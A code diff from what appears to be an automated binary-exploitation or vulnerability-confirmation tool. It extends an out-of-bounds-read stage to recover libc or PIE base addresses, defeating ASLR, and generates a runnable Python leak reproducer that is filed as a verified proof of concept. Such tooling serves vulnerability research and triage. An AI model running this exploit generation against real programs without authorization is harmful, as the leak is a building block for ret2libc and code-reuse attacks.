@@ -2422,15 +2422,16 @@ def _file_recipe(ctx, target, lead, vclass, win, recipe, why, seq_for=None) -> N
                            missing_technique=_CHAIN_TECHNIQUE.get(vclass))
 
 
-def _oob_read_repro_script(read_opt, idx, name, sym_off) -> bytes:
-    """A stdlib-only reproducer for the OOB-read libc disclosure: drive the read option at the
-    out-of-bounds index that lands on `name`@got, parse the disclosed pointer and subtract the
-    symbol's offset in the linked libc -- a page-aligned result is the recovered base."""
+def _oob_read_repro_script(read_opt, idx, label, off) -> bytes:
+    """A stdlib-only reproducer for the OOB-read base disclosure: drive the read option at the
+    out-of-bounds index that discloses a known pointer (a libc symbol's GOT slot, or an image
+    pointer), parse it and subtract the baked offset -- a page-aligned result is the recovered base
+    (the libc base for a GOT slot, the PIE image base for an image pointer)."""
     return (
         "#!/usr/bin/env python3\n"
         "# OOB-read info-disclosure reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
         "import subprocess, select, os, re, sys, time\n"
-        f"READ={read_opt!r}; IDX={idx}; NAME={name!r}; SYM_OFF={sym_off:#x}\n"
+        f"READ={read_opt!r}; IDX={idx}; LABEL={label!r}; OFF={off:#x}\n"
         "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
         "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
         "def drain(t=0.4):\n"
@@ -2448,49 +2449,60 @@ def _oob_read_repro_script(read_opt, idx, name, sym_off) -> bytes:
         "send(READ+'\\n'); send(str(IDX)+'\\n'); out=drain()\n"
         "vals=[int(m,16) for m in re.findall(rb'0x([0-9a-fA-F]{6,16})',out)]\n"
         "vals+=[int(m)&0xffffffffffffffff for m in re.findall(rb'-?\\d{3,25}',out)]\n"
-        "base=next((v-SYM_OFF for v in vals if (v-SYM_OFF)>0 and (v-SYM_OFF)%0x1000==0), None)\n"
-        "print('[+] leaked %s -> libc base %#x'%(NAME,base) if base else '[-] no base disclosed')\n"
+        "base=next((v-OFF for v in vals if (v-OFF)>0 and (v-OFF)%0x1000==0), None)\n"
+        "print('[+] leaked %s -> base %#x'%(LABEL,base) if base else '[-] no base disclosed')\n"
         "sys.exit(0 if base else 1)\n"
     ).encode()
 
 
-def _file_oob_read_disclose_l3(ctx, target, lead, arr, read_opt, name, gaddr, idx, base, *,
-                               sym_off, stride):
+def _file_oob_read_disclose_l3(ctx, target, lead, hit):
     """File a confirmed out-of-bounds-read information disclosure as an L3 verified PoC: the exploit
-    IS the disclosure (a recovered libc base), bundle = target + a runnable leak reproducer."""
+    IS the disclosure (a recovered libc or PIE base), bundle = target + a runnable leak reproducer.
+    `hit` is the dict from `_oob_read_disclose` (kind 'libc' or 'pie')."""
     import json as _json
 
     from ...db.dao import FindingDAO, PocDAO
     from . import bundle
-    script = _oob_read_repro_script(read_opt, idx, name, sym_off)
+    arr, read_opt, kind, idx, base, off = (hit["array"], hit["read_opt"], hit["kind"], hit["idx"],
+                                           hit["base"], hit["off"])
+    arrn = arr.get("name") or f"{arr['addr']:#x}"
+    stride = arr.get("stride", 8) or 8
+    label = f"{hit['name']}@got" if kind == "libc" else "image pointer"
+    base_kind = "libc base" if kind == "libc" else "PIE image base"
+    script = _oob_read_repro_script(read_opt, idx, label, off)
     input_sha = ctx.put_artifact("oob-read-disclose-repro", data=script)
     meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
-            "exploit": "CWE-125 out-of-bounds read -> libc-base disclosure", "target": name,
-            "libc_base": hex(base), "array": arr.get("name"), "index": idx,
+            "exploit": f"CWE-125 out-of-bounds read -> {base_kind} disclosure", "target": label,
+            "base": hex(base), "base_kind": kind, "array": arr.get("name"), "index": idx,
             "tool_version": TOOL_VERSION}
     data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                         "stdin", [], None,
-                        primitive={"type": "oob_read", "target": f"{name}@got", "index": idx,
-                                   "confirmed": True, "note": "libc-base disclosure"})
+                        primitive={"type": "oob_read", "target": label, "index": idx,
+                                   "confirmed": True, "note": f"{base_kind} disclosure"})
     bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
     poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                      signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
-    arrn = arr.get("name") or f"{arr['addr']:#x}"
-    eff = (f"working information disclosure (CWE-125 out-of-bounds read): option {read_opt} read "
-           f"index {idx} of the {arrn} array -- {(idx * stride):#x} bytes {'before' if idx < 0 else 'past'} "
-           f"its base -- which lands on {name}@got ({gaddr:#x}), disclosing the resolved libc "
-           f"address of {name} and so the libc base {base:#x} (ASLR defeated). Forgery-proof: the "
-           f"disclosed value minus {name}'s offset in the linked libc is page aligned, which an "
-           f"echo or an in-bounds read cannot produce (the negative control did not). This is the "
-           f"leak a ret2libc / FSOP chain consumes.")
+    where = (f"lands on {hit['name']}@got ({hit['gaddr']:#x}), disclosing the resolved libc address "
+             f"of {hit['name']}" if kind == "libc"
+             else "sweeps up image pointers whose page offsets corroborate the load base")
+    forge = (f"the disclosed value minus {hit['name']}'s offset in the linked libc is page aligned"
+             if kind == "libc"
+             else "at least two distinct leaked pointers' page offsets match image symbols and agree")
+    eff = (f"working information disclosure (CWE-125 out-of-bounds read -> {base_kind}): option "
+           f"{read_opt} read index {idx} of the {arrn} array -- {abs(idx) * stride:#x} bytes "
+           f"{'before' if idx < 0 else 'past'} its base -- which {where}, recovering the {base_kind} "
+           f"{base:#x} (ASLR defeated). Forgery-proof: {forge}, which an echo or an in-bounds read "
+           f"cannot produce (the negative control did not). This is the leak a "
+           f"{'ret2libc / FSOP' if kind == 'libc' else 'PIE ret2win / code-reuse'} chain consumes.")
     fd = FindingDAO(ctx.conn)
     cand = {"cwe": lead.cwe,
-            "title": "Information disclosure (demonstrated): L3 OOB read -> libc base",
+            "title": f"Information disclosure (demonstrated): L3 OOB read -> {base_kind}",
             "severity": "high", "detector": "chain_primitive", "state": "poc-backed",
             "confidence": 0.99, "authoritative": True, "title_only": True,
-            "dedup_key": f"chain:oob-read-disclose:{target.id}", "site_detail": f"{name}@got",
+            "dedup_key": f"chain:oob-read-disclose:{kind}:{target.id}", "site_detail": label,
             "evidence": [{"channel": "effects", "detail": _json.dumps([{
-                "kind": "disclosure", "title": "Out-of-bounds read -> libc base (ASLR defeated)",
+                "kind": "disclosure",
+                "title": f"Out-of-bounds read -> {base_kind} (ASLR defeated)",
                 "status": "demonstrated", "detail": eff,
                 "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                           "note": eff}}])}]}
@@ -2500,10 +2512,10 @@ def _file_oob_read_disclose_l3(ctx, target, lead, arr, read_opt, name, gaddr, id
         PocDAO(ctx.conn).set_finding(poc_id, fid)
     _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
     ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": "oob_read",
-             "disclosure": name, "libc_base": hex(base), "index": idx, "bundle": bundle_sha})
-    ctx.progress(pct=100, msg=f"L3 CONFIRMED: OOB read -> libc base {base:#x} (via {name}@got)")
+             "disclosure": base_kind, "base": hex(base), "index": idx, "bundle": bundle_sha})
+    ctx.progress(pct=100, msg=f"L3 CONFIRMED: OOB read -> {base_kind} {base:#x}")
     return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
-            "metrics": {"chained": True, "level": "L3", "vclass": "oob_read", "disclosure": True}}
+            "metrics": {"chained": True, "level": "L3", "vclass": "oob_read", "disclosure": kind}}
 
 
 # ------------------------------------------------------- CWE-125 out-of-bounds read -> disclosure
@@ -2524,20 +2536,26 @@ def _int_from_output(out: bytes):
     return vals
 
 
-def _oob_read_disclose(ctx, spawn, width, opts, model, arrays, got, syms):
-    """Steer an out-of-bounds READ onto a GOT slot and DISCLOSE the libc base: for each (array,
-    read option, libc-named GOT slot), drive the read at index (got - base)/stride, resolve the
-    disclosed value against the linked libc, and accept only a PAGE-ALIGNED base (forgery-proof --
-    an echo of the index or a legitimate in-bounds value cannot produce one). Gated by a negative
-    control: the SAME option read IN BOUNDS must NOT resolve a base, so the leak is the OOB access,
-    not incidental output. Returns (array, read_opt, got_name, got_addr, idx, base) or None."""
+def _oob_read_disclose(ctx, spawn, width, opts, model, arrays, got, syms, target_bytes):
+    """Steer an out-of-bounds READ and DISCLOSE a base address -- the libc base (via a GOT slot that
+    names a libc symbol) or the PIE image base (via image pointers the read sweeps up). Both are
+    forgery-proof + 0-false-confirmation:
+      * libc -- the disclosed value minus the symbol's offset in the LINKED libc must be PAGE
+        ALIGNED (rop.resolve_libc_base); an echo or an in-bounds value cannot be;
+      * PIE  -- recover_pie_base matches the disclosed pointers' page offsets against the image's
+        OWN symbols and accepts a base only when >= 2 distinct leaked slots corroborate it.
+    Gated by a negative control: the SAME option read IN BOUNDS must NOT disclose either base, so
+    the leak is the out-of-bounds access, not incidental output. Returns a dict
+    {array, read_opt, kind: 'libc'|'pie', base, ...} or None. libc is preferred (needs no second
+    pointer); PIE is the ASLR defeat a position-independent target's own chains need."""
     from ..fuzz import menu
+    from . import exploit
     read_opts = [o for o in opts if o in model and model[o][:1] == ["idx"]]
+    if not (read_opts and arrays):
+        return None
     slots = [(n, a) for n, a in sorted(got.items(),
              key=lambda kv: (_HOT_GOT.index(kv[0]) if kv[0] in _HOT_GOT else 99, kv[0]))
              if n in syms]
-    if not (read_opts and slots and arrays):
-        return None
 
     def _read(proc, opt, idx):
         proc.stdin.write(menu._scalar(opt.encode(), width) + menu._scalar(str(idx).encode(), width))
@@ -2546,31 +2564,66 @@ def _oob_read_disclose(ctx, spawn, width, opts, model, arrays, got, syms):
 
     attempts = 0
     for arr in arrays:
-        base_addr, stride = arr["addr"], arr.get("stride", 8) or 8
+        base_addr, stride, cap = arr["addr"], arr.get("stride", 8) or 8, arr.get("cap", 8)
+        if stride <= 0:
+            continue
         for read_opt in read_opts:
             proc = spawn()
             try:
                 _pie_drain(proc)
-                # negative control first: an in-bounds read must disclose nothing libc-shaped.
-                in_bounds = _read(proc, read_opt, 0)
-                neg_resolves = any(rop_resolve(v, syms) for v in _int_from_output(in_bounds))
+                neg_vals = _int_from_output(_read(proc, read_opt, 0))       # in-bounds control
+                neg_libc = any(rop_resolve(v, syms) for v in neg_vals)
+                neg_pie = bool(exploit.recover_pie_base(neg_vals, target_bytes))
+                collected = []                             # (idx, value) across OOB reads
+                # (1) libc: each libc-named GOT slot at its exact OOB index.
                 for name, gaddr in slots:
-                    if stride <= 0 or (gaddr - base_addr) % stride:
+                    if (gaddr - base_addr) % stride:
                         continue
                     idx = (gaddr - base_addr) // stride
-                    if ctx.should_cancel() or attempts >= 240:
+                    if ctx.should_cancel() or attempts >= 300:
                         return None
                     attempts += 1
-                    out = _read(proc, read_opt, idx)
-                    for v in _int_from_output(out):
+                    vals = _int_from_output(_read(proc, read_opt, idx))
+                    collected += [(idx, v) for v in vals]
+                    for v in vals:
                         b = rop_resolve_one(v, syms.get(name))
-                        if b and not neg_resolves:
-                            ctx.progress(msg=(f"OOB read: option {read_opt} index {idx} ({name}@got "
-                                              f"{gaddr:#x}) disclosed libc base {b:#x}"))
-                            return arr, read_opt, name, gaddr, idx, b
+                        if b and not neg_libc:
+                            ctx.progress(msg=(f"OOB read: option {read_opt} index {idx} "
+                                              f"({name}@got {gaddr:#x}) disclosed libc base {b:#x}"))
+                            return {"array": arr, "read_opt": read_opt, "kind": "libc", "name": name,
+                                    "gaddr": gaddr, "idx": idx, "base": b, "off": syms[name]}
+                # (2) PIE: sweep a window of OOB indices (both sides of the array) collecting image
+                # pointers, and recover the base from their >=2-way agreement.
+                for idx in list(range(-8, 0)) + list(range(cap, cap + 24)):
+                    if ctx.should_cancel() or attempts >= 300:
+                        break
+                    attempts += 1
+                    collected += [(idx, v) for v in _int_from_output(_read(proc, read_opt, idx))]
+                oob = [v for i, v in collected if i < 0 or i >= cap]
+                pie = exploit.recover_pie_base(oob, target_bytes)
+                if pie and not neg_pie:
+                    anchor = _pie_anchor(collected, pie, cap, target_bytes)
+                    if anchor:
+                        aidx, avaddr = anchor
+                        ctx.progress(msg=(f"OOB read: option {read_opt} swept image pointers -> PIE "
+                                          f"base {pie:#x} (index {aidx} discloses +{avaddr:#x})"))
+                        return {"array": arr, "read_opt": read_opt, "kind": "pie", "base": pie,
+                                "idx": aidx, "off": avaddr}
             finally:
                 from ..dynamic import sandbox as _sb
                 _sb.kill_quietly(proc)
+    return None
+
+
+def _pie_anchor(collected, base, cap, target_bytes):
+    """A concrete (oob_index, image_vaddr) a reproducer can bake: an OOB-disclosed value that equals
+    base + a known image symbol vaddr, so the repro reads that index and subtracts the vaddr."""
+    from . import exploit
+    anchors = set(exploit.elf_functions(target_bytes).values()) \
+        | set(exploit.elf_objects(target_bytes).values())
+    for idx, v in collected:
+        if (idx < 0 or idx >= cap) and (v - base) in anchors:
+            return idx, v - base
     return None
 
 
@@ -2608,12 +2661,10 @@ def _oob_read_disclose_stage(ctx, target, lead):
                   or oob_index._array_candidates_symfree(Path(exe)))
         spawn = _pie_spawn(wd, exe)
         hit = _oob_read_disclose(ctx, spawn, width, opts, model, arrays,
-                                 {n: got[n] for n in syms}, syms)
+                                 {n: got[n] for n in syms}, syms, target_bytes)
         if not hit:
             return None
-        arr, read_opt, name, gaddr, idx, base = hit
-        return _file_oob_read_disclose_l3(ctx, target, lead, arr, read_opt, name, gaddr, idx, base,
-                                          sym_off=syms[name], stride=arr.get("stride", 8) or 8)
+        return _file_oob_read_disclose_l3(ctx, target, lead, hit)
     finally:
         shutil.rmtree(wd, ignore_errors=True)
 
